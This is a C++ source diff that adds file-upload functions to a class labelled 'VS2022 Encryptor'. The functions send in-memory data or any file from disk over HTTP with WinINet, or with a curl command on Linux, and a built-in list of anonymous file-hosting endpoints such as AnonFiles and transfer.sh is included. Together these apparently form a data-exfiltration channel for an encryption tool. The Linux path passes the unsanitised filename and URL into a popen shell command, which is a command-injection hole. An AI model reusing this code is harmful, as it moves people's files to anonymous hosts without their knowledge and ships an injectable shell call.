@@ -116,4 +116,184 @@ public:
     bool isValidURL(const std::string& url) {
         return (url.substr(0, 7) == "http://" || url.substr(0, 8) == "https://");
     }
+
+    // Upload file to URL
+    bool uploadFile(const std::string& url, const std::vector<uint8_t>& data, 
+                    const std::string& filename = "upload.bin") {
+#ifdef _WIN32
+        return uploadFileWindows(url, data, filename);
+#else
+        return uploadFileLinux(url, data, filename);
+#endif
+    }
+
+private:
+#ifdef _WIN32
+    // Windows upload implementation
+    bool uploadFileWindows(const std::string& url, const std::vector<uint8_t>& data,
+                          const std::string& filename) {
+        HINTERNET hInternet = InternetOpenA("VS2022 Encryptor/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (!hInternet) return false;
+
+        // Parse URL to get host and path
+        URL_COMPONENTSA urlComp = {0};
+        urlComp.dwStructSize = sizeof(urlComp);
+        char hostName[256] = {0};
+        char urlPath[1024] = {0};
+        urlComp.lpszHostName = hostName;
+        urlComp.dwHostNameLength = sizeof(hostName);
+        urlComp.lpszUrlPath = urlPath;
+        urlComp.dwUrlPathLength = sizeof(urlPath);
+        
+        if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        // Connect to server
+        HINTERNET hConnect = InternetConnectA(hInternet, hostName, 
+            urlComp.nPort ? urlComp.nPort : (urlComp.nScheme == INTERNET_SCHEME_HTTPS ? 443 : 80),
+            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        // Create multipart/form-data boundary
+        std::string boundary = "----BoundaryString" + std::to_string(GetTickCount());
+        
+        // Build request body
+        std::stringstream body;
+        body << "--" << boundary << "\r\n";
+        body << "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename << "\"\r\n";
+        body << "Content-Type: application/octet-stream\r\n\r\n";
+        std::string prefix = body.str();
+        
+        std::string suffix = "\r\n--" + boundary + "--\r\n";
+        
+        // Calculate total size
+        DWORD totalSize = prefix.length() + data.size() + suffix.length();
+
+        // Create request
+        DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_FLAG_SECURE : 0;
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        // Add headers
+        std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
+        HttpAddRequestHeadersA(hRequest, contentType.c_str(), -1, HTTP_ADDREQ_FLAG_ADD);
+
+        // Send request
+        INTERNET_BUFFERSA bufferIn = {0};
+        bufferIn.dwStructSize = sizeof(INTERNET_BUFFERSA);
+        bufferIn.dwBufferTotal = totalSize;
+
+        if (!HttpSendRequestExA(hRequest, &bufferIn, NULL, 0, 0)) {
+            InternetCloseHandle(hRequest);
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        // Write data
+        DWORD bytesWritten;
+        InternetWriteFile(hRequest, prefix.c_str(), prefix.length(), &bytesWritten);
+        InternetWriteFile(hRequest, data.data(), data.size(), &bytesWritten);
+        InternetWriteFile(hRequest, suffix.c_str(), suffix.length(), &bytesWritten);
+
+        // End request
+        if (!HttpEndRequestA(hRequest, NULL, 0, 0)) {
+            InternetCloseHandle(hRequest);
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        // Check response
+        DWORD statusCode = 0;
+        DWORD statusSize = sizeof(statusCode);
+        HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
+                      &statusCode, &statusSize, NULL);
+
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+
+        return (statusCode >= 200 && statusCode < 300);
+    }
+#else
+    // Linux upload implementation using curl
+    bool uploadFileLinux(const std::string& url, const std::vector<uint8_t>& data,
+                        const std::string& filename) {
+        // Save data to temporary file
+        std::string tempFile = "/tmp/upload_" + std::to_string(getpid()) + ".tmp";
+        std::ofstream outFile(tempFile, std::ios::binary);
+        if (!outFile) return false;
+        
+        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
+        outFile.close();
+
+        // Use curl to upload
+        std::string cmd = "curl -s -o /dev/null -w \"%{http_code}\" -F \"file=@" + tempFile + 
+                         ";filename=" + filename + "\" \"" + url + "\"";
+        
+        FILE* pipe = popen(cmd.c_str(), "r");
+        if (!pipe) {
+            unlink(tempFile.c_str());
+            return false;
+        }
+
+        char buffer[128];
+        std::string result = "";
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            result += buffer;
+        }
+        
+        int exitCode = pclose(pipe);
+        unlink(tempFile.c_str());
+
+        // Check if status code is 2xx
+        try {
+            int statusCode = std::stoi(result);
+            return (statusCode >= 200 && statusCode < 300);
+        } catch (...) {
+            return false;
+        }
+    }
+#endif
+
+public:
+    // Upload file from disk
+    bool uploadFileFromDisk(const std::string& url, const std::string& filePath) {
+        std::ifstream file(filePath, std::ios::binary);
+        if (!file) return false;
+
+        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), 
+                                 std::istreambuf_iterator<char>());
+        file.close();
+
+        std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
+        return uploadFile(url, data, filename);
+    }
+
+    // Popular file hosting services support
+    struct FileHostingService {
+        std::string name;
+        std::string uploadEndpoint;
+        size_t maxFileSize;
+    };
+
+    std::vector<FileHostingService> getFileHostingServices() {
+        return {
+            {"AnonFiles", "https://api.anonfiles.com/upload", 20 * 1024 * 1024}, // 20MB
+            {"File.io", "https://file.io", 100 * 1024 * 1024}, // 100MB
+            {"Transfer.sh", "https://transfer.sh", 10 * 1024 * 1024 * 1024LL}, // 10GB
+            {"GoFile", "https://store1.gofile.io/uploadFile", 5 * 1024 * 1024 * 1024LL}, // 5GB
+            {"WeTransfer", "https://wetransfer.com/api/v4/transfers", 2 * 1024 * 1024 * 1024LL} // 2GB
+        };
+    }
 };
